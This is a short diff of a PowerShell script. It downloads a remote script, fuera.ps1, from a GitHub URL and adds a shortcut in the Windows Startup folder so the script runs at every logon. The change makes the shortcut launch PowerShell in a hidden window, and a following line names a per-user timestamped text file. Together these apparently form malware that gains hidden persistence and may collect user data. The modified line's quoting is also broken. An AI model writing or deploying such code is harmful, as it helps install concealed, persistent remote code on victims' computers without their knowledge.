@@ -2,7 +2,7 @@ Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/fuera.ps1" -
 
 $WScriptShell = New-Object -ComObject WScript.Shell
 $shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.lnk")
-$shortcut.TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.ps1"
+$shortcut.TargetPath = "powershell -w h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.ps1""
 $shortcut.Save()
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm).txt"
